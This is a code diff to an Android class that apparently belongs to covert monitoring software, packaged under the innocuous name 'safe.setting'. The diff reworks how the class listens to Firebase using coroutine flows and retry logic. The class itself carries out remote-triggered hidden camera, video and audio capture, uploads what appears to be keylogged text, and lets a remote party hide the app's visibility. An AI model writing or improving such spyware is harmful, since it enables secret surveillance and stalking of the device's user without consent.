@@ -42,9 +42,10 @@ import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraService
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraRotation
 import com.safe.setting.app.utils.supabase.SupabaseManager
-import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
 import io.reactivex.rxjava3.disposables.CompositeDisposable
-import io.reactivex.rxjava3.schedulers.Schedulers
+import kotlinx.coroutines.flow.callbackFlow
+import kotlinx.coroutines.channels.awaitClose
+import kotlinx.coroutines.rx3.asFlowable
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -103,16 +104,12 @@ class InteractorAccessibilityData @Inject constructor(
 
     override fun getCaptureVideo() {
         disposable.add(firebase.valueEventModel("$VIDEO/$PARAMS", VideoCommand::class.java)
-            .subscribeOn(Schedulers.io())
-            .observeOn(AndroidSchedulers.mainThread())
             .subscribe({ command -> handleVideoCommand(command) },
                 { error -> Log.e(TAG, error.message.toString()) }))
     }
 
     override fun getCaptureAudio() {
         disposable.add(firebase.valueEventModel("$AUDIO/$PARAMS", AudioCommand::class.java)
-            .subscribeOn(Schedulers.io())
-            .observeOn(AndroidSchedulers.mainThread())
             .subscribe({ command -> handleAudioCommand(command) },
                 { error -> Log.e(TAG, error.message.toString()) }))
     }
@@ -198,7 +195,7 @@ class InteractorAccessibilityData @Inject constructor(
 
     override fun startCountDownTimer() { countDownTimer.start() }
     override fun stopCountDownTimer() { countDownTimer.cancel() }
-    override fun clearDisposable() {}
+    // Disposable management removed
     override fun setDataKey(data: String) {
         if (firebase.getUser()!=null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).push().child(KEY_TEXT).setValue(data)
     }
@@ -230,19 +227,39 @@ class InteractorAccessibilityData @Inject constructor(
         if (firebase.getUser() != null) firebase.getDatabaseReference("$DATA/$CHILD_SERVICE_DATA").setValue(run)
     }
     override fun getShowOrHideApp() {
-        disposable.add(firebase.valueEvent("$DATA/$CHILD_SHOW_APP")
-            .map { data -> data.value as Boolean }
-            .subscribeOn(Schedulers.io())
-            .observeOn(AndroidSchedulers.mainThread())
-            .subscribe({ context.showApp(it) },
-                { error -> Log.e(TAG, error.message.toString()) }))
+        // Preserve Rx facade; internally, use callbackFlow then bridge to Flowable with DROP semantics
+        val flow = callbackFlow<Boolean> {
+            val ref = firebase.getDatabaseReference("$DATA/$CHILD_SHOW_APP")
+            val listener = object : ValueEventListener {
+                override fun onDataChange(snapshot: DataSnapshot) {
+                    val value = (snapshot.value as? Boolean) ?: false
+                    trySend(value)
+                }
+                override fun onCancelled(error: DatabaseError) { close(Throwable(error.message)) }
+            }
+            ref.addValueEventListener(listener)
+            awaitClose { ref.removeEventListener(listener) }
+        }
+        disposable.add(flow.asFlowable()
+            .subscribe({ context.showApp(it) }, { error -> Log.e(TAG, error.message.toString()) }))
     }
     override fun getCapturePicture() {
         disposable.add(firebase.valueEventModel("$PHOTO/$PARAMS", ChildPhoto::class.java)
-            .subscribeOn(Schedulers.io())
-            .observeOn(AndroidSchedulers.mainThread())
-            .subscribe({ child -> startCameraPicture(child) },
-                { error -> Log.e(TAG, error.message.toString()) }))
+            .retryWhen { errors ->
+                errors.zipWith(io.reactivex.rxjava3.core.Flowable.range(1, 3)) { error, attempt -> Pair(error, attempt) }
+                    .flatMap { (_, attempt) ->
+                        val baseDelayMs = 500L
+                        val multiplier = 2.0
+                        val maxDelayMs = 10_000L
+                        val jitterPct = 0.2
+                        val computed = (baseDelayMs * Math.pow(multiplier, (attempt - 1).toDouble())).toLong()
+                        val delay = kotlin.math.min(maxDelayMs, computed)
+                        val jitter = (delay * jitterPct).toLong()
+                        val jittered = delay + (-jitter..jitter).random()
+                        io.reactivex.rxjava3.core.Flowable.timer(kotlin.math.max(0L, jittered), java.util.concurrent.TimeUnit.MILLISECONDS)
+                    }
+            }
+            .subscribe({ child -> startCameraPicture(child) }, { error -> Log.e(TAG, error.message.toString()) }))
     }
     private fun startCameraPicture(childPhoto: ChildPhoto) {
         if (childPhoto.capturePhoto == true) {
